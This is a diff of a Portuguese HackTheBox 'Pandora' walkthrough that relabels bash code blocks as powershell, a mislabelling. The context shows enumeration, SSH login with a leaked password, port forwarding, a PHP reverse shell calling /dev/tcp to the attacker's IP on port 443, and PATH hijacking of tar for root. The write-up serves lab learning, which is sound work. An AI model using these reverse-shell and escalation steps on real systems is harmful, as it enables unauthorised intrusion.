@@ -212,12 +212,12 @@
 <p>Utilizando a ferramenta <em>whatweb</em>, foram encontrados dois endereços de e-mail relacionados à máquina: <em>contact@panda.htb</em> e <em>support@panda.htb</em>. Isso pode indicar a presença de um servidor de e-mail SMTP ou de Virtual Hosting. Acerca do serviço de e-mail, não existe nenhuma porta relacionada aberta. Como se trata de uma máquina de dificuldade fácil, vamos descartar a possibilidade de existir um servidor de e-mail SMTP.</p>
 <h2 id="virtualhosting-e-webpage"><a class="header" href="#virtualhosting-e-webpage">VirtualHosting e WebPage</a></h2>
 <p>Para verificar se existe Virtual Hosting, vamos começar pelo básico: adicionar o host ao arquivo /etc/hosts. Temos um potencial hostname válido, o <strong>panda.htb</strong></p>
-<pre><code class="language-bash">sudo su
+<pre><code class="language-powershell">sudo su
 echo &quot;\n\n10.10.11.136\tpanda.htb&quot; &gt;&gt; /etc/hosts
 </code></pre>
 <p>Ao acessar o URL http://10.10.11.136/ ou http://panda.htb, não foram encontradas alterações na página.</p>
 <p>Após a enumeração das rotas do site, tanto pelo http://10.10.11.136/ quanto pelo http://panda.htb, nada de interessante foi encontrado. Também foram testados outros nomes de hosts com a mesma ferramenta, mas nada de novo foi descoberto. Para isso, é necessário adicionar os novos hosts ao arquivo /etc/hosts.</p>
-<pre><code class="language-bash"># Enumeração das rotas do site http://panda.htb, bem como de possíveis ficheiros txt, js, html, php. Para o site http://10.10.11.136/ é só substituir... mas o resultado é o mesmo
+<pre><code class="language-powershell"># Enumeração das rotas do site http://panda.htb, bem como de possíveis ficheiros txt, js, html, php. Para o site http://10.10.11.136/ é só substituir... mas o resultado é o mesmo
 ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://panda.htb/FUZZ -t 200 -r -e .txt,.js,.html,.php
 
 # Enumeração dos hosts
@@ -234,7 +234,7 @@ ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11
 </ul>
 <p>Portanto, no UDP, o Nmap não pode saber se a conexão está demorando porque não está aberta, se foi bloqueada por um firewall ou se está aberta, mas para um programa que não tem a função de enviar uma resposta (está recebendo silenciosamente a informação que o Nmap enviou), ou seja, o que for...</p>
 <p>Em resumo, no UDP (e considerando que estamos em um CTF), é recomendável limitar o número de portas às 20 portas mais comuns (por exemplo).</p>
-<pre><code class="language-bash">sudo nmap --top-ports 20 -sU $IP -vvv
+<pre><code class="language-powershell">sudo nmap --top-ports 20 -sU $IP -vvv
 # ...
 # 161/udp   open          snmp         udp-response ttl 63
 # ...
@@ -244,7 +244,7 @@ ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11
 <h2 id="snmp"><a class="header" href="#snmp">SNMP</a></h2>
 <p>Já agora, o que é este serviço?</p>
 <p>SNMP (Simple Network Management Protocol) é um protocolo padrão para gerenciamento de redes. Ele é usado para monitorar e gerenciar dispositivos de rede, como roteadores, switches, servidores e outros dispositivos de rede. O SNMP permite que os administradores de rede monitorem o desempenho da rede, detectem problemas e gerenciem dispositivos de rede remotamente. Ele usa uma arquitetura cliente-servidor, onde os dispositivos de rede são os servidores e os computadores de gerenciamento são os clientes. O SNMP é um protocolo de rede amplamente utilizado e é suportado por muitos dispositivos de rede.</p>
-<pre><code class="language-bash">snmp-check 10.10.11.136
+<pre><code class="language-powershell">snmp-check 10.10.11.136
 # ...
 # 127.0.0.1    3306         0.0.0.0      0            listen
 # 127.0.0.53   53           0.0.0.0      0            listen
@@ -260,7 +260,7 @@ ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11
 <h1 id="getting-shell"><a class="header" href="#getting-shell">Getting Shell</a></h1>
 <h2 id="ssh"><a class="header" href="#ssh">SSH</a></h2>
 <p>A porta SSH encontra-se aberta, e temos credenciais. Vamos simplesmente tentar fazer login via SSH.</p>
-<pre><code class="language-bash">sshpass -p HotelBabylon23 ssh daniel@10.10.11.136
+<pre><code class="language-powershell">sshpass -p HotelBabylon23 ssh daniel@10.10.11.136
 </code></pre>
 <p>Estamos na máquina!</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/foothold.png" alt="foothold" /></p>
@@ -284,7 +284,7 @@ ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-11
 <blockquote>
 <p>Ok... Mas já estamos na máquina alvo... para que serve de &quot;sair&quot; para &quot;entrar&quot; de novo por outra via?</p>
 </blockquote>
-<pre><code class="language-bash">daniel@pandora:/var/www$ ll
+<pre><code class="language-powershell">daniel@pandora:/var/www$ ll
 total 16
 drwxr-xr-x  4 root root 4096 Dec  7 14:32 ./
 drwxr-xr-x 14 root root 4096 Dec  7 14:32 ../
@@ -298,7 +298,7 @@ drwxr-xr-x  3 matt matt 4096 Dec  7 14:32 pandora/
 </ul>
 <h2 id="portforwarding"><a class="header" href="#portforwarding">PortForwarding</a></h2>
 <p>Para fazer port forwarding, podemos usar uma ferramenta que nunca me falhou, é fácil de usar e é multi plataforma: O &quot;<strong><em>Chisel</em></strong>&quot;. Mas para este caso nem vai ser necessário, porque estamos na máquina via SSH, e o próprio SSH tem a opção de port forwarding. Para isso, basta terminar a conexão actual com a máquina vítima, e entrar novamente com uma flag a mais. A flag &quot;<strong><em>-L</em></strong>&quot;</p>
-<pre><code class="language-bash">sshpass -p HotelBabylon23 ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
+<pre><code class="language-powershell">sshpass -p HotelBabylon23 ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
 </code></pre>
 <p>A partir de agora, o nosso próprio kali-linux (ou o sistema que for) está com a porta 80 ocupada com o servidor web da máquina vítima.</p>
 <p><img src="Assets/HTB-Linux-Easy-Pandora/sitepandora.png" alt="sitepandora" /></p>
@@ -306,7 +306,7 @@ drwxr-xr-x  3 matt matt 4096 Dec  7 14:32 pandora/
 <blockquote>
 <p><a href="https://pandorafms.com/manual/en/documentation/08_technical_reference/02_annex_externalapi">Documentação do pandora - api</a></p>
 </blockquote>
-<pre><code class="language-bash">curl http://127.0.0.1/pandora_console/include/api.php?info=version
+<pre><code class="language-powershell">curl http://127.0.0.1/pandora_console/include/api.php?info=version
 # Pandora FMS v7.0NG.742_FIX_PERL2020 - PC200103 MR34
 </code></pre>
 <p>Pesquisando com a ferramenta &quot;<strong><em>searchsploit</em></strong>&quot;, não foi possível encontrar nenhum exploit que funcionasse. Pesquisando pelo google, vi que o próprio site da Pandora FMS tem tudo sobre as suas vulnerabilidades!</p>
@@ -335,14 +335,14 @@ drwxr-xr-x  3 matt matt 4096 Dec  7 14:32 pandora/
 # Para diretamente ter o reverse shell:
 &lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.230/443 0&gt;&amp;1'&quot;);?&gt;
 </code></pre>
-<pre><code class="language-bash"># Executar o nc em modo de escuta para receber o shell:
+<pre><code class="language-powershell"># Executar o nc em modo de escuta para receber o shell:
 kali@kali: &gt;     nc -lvnp 443
 
 # Em outra consola, executar o ficheiro que &quot;uploadamos&quot; (Eu escolhi chamar o ficheiro de shell.php...)
 kali@kali: &gt;     curl http://localhost/pandora_console/images/shell.php
 </code></pre>
 <h3 id="estabilizar-o-reverse-shell"><a class="header" href="#estabilizar-o-reverse-shell">Estabilizar o Reverse Shell</a></h3>
-<pre><code class="language-bash">script /dev/null -c bash
+<pre><code class="language-powershell">script /dev/null -c bash
 export TERM=xterm
 export SHELL=bash
 
@@ -359,15 +359,15 @@ stty rows 40 columns 170  # Tem corresponder ao vosso ecrã (stty -a numa consol
 <p>O que isto quer dizer?</p>
 <h2 id="path-hijacking"><a class="header" href="#path-hijacking">Path Hijacking</a></h2>
 <p>Sabemos que o binário pandora_backup usa o tar. Onde se encontra isso?</p>
-<pre><code class="language-bash">which tar
+<pre><code class="language-powershell">which tar
 # /usr/bin/tar
 </code></pre>
 <p>Ok. Mas como é que o computador sabe que está ali o programa? Existe uma variável no shell que indica isso. Chama-se PATH:</p>
-<pre><code class="language-bash">echo $PATH
+<pre><code class="language-powershell">echo $PATH
 # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 </code></pre>
 <p>É assim que o computador procura o programa, primeiro procura em &quot;<strong><em>/usr/local/sbin</em></strong>&quot;, depois em &quot;<strong><em>/usr/local/bin</em></strong>&quot;, e assim sucessivamente. Todas as pastas estão separadas pelos dois pontos &quot;:&quot;. Mas esta variável é apenas uma variável que o nosso shell actual têm, que facilmente se altera.</p>
-<pre><code class="language-bash">export PATH=.:$PATH
+<pre><code class="language-powershell">export PATH=.:$PATH
 echo $PATH
 # .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 </code></pre>
@@ -376,7 +376,7 @@ echo $PATH
 <p><img src="Assets/HTB-Linux-Easy-Pandora/pathhijacknotwork.png" alt="pathhijacknotwork" /></p>
 <h4 id="não-funcionou-porquê"><a class="header" href="#não-funcionou-porquê">Não funcionou! Porquê?</a></h4>
 <p>Sinceramente não sei, o que sei é que pelo ssh funcionou nesta máquina... Quando vi que não funcionou, procurei outra solução. criei uma chave id_rsa só para ter melhor conexão, conectei-me via SSH e o mesmo exploit funcionou... OK. Mistérios do Hacking!</p>
-<pre><code class="language-bash">ssh-keygen
+<pre><code class="language-powershell">ssh-keygen
 cd /home/matt/.ssh
 cat id_rsa.pub &gt; authorized_keys
 cat id_rsa
